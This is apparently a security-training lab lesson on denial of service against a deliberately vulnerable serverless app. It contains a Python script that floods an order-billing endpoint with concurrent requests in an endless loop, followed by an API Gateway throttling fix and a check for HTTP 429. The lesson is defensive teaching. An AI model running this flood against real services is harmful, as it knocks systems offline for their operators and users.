# Lesson 06 - Denial of Service (DoS)

> Use only your own DVSA API and order. The goal is to prove the need for throttling, then verify that API Gateway returns `429 Too Many Requests` after the fix.

## Environment

```bash
export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN_ATTACKER="<attacker-jwt>"
export ORDER_ID="<target-order-id>"
```

## Python flood helper used for the lesson

```python
# dos_billing_test.py
import os
import time
import threading
import requests

API = os.environ["API"]
TOKEN = os.environ["TOKEN_ATTACKER"]
ORDER_ID = os.environ["ORDER_ID"]

payload = {
    "action": "billing",
    "order-id": ORDER_ID,
    "data": {
        "ccn": "4242424242424242",
        "exp": "10/2030",
        "cvv": "123"
    }
}

headers = {
    "content-type": "application/json",
    "authorization": TOKEN
}

def send_one(i):
    try:
        r = requests.post(API, json=payload, headers=headers, timeout=10)
        print(i, r.status_code, r.text[:120])
    except Exception as e:
        print(i, "ERR", e)

while True:
    threads = []
    for i in range(30):
        t = threading.Thread(target=send_one, args=(i,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    time.sleep(0.2)
```

Run it:

```bash
python3 dos_billing_test.py
```

Expected pre-fix evidence:

```text
Repeated backend failures such as HTTP 500.
```

## API Gateway fix values

```text
API Gateway -> DVSA-APIS -> Stages -> Stage -> Throttling
Rate: 5 requests/second
Burst: 10 requests
```

## Post-fix verification

```bash
python3 dos_billing_test.py
```

Expected post-fix evidence:

```text
HTTP 429 Too Many Requests
```
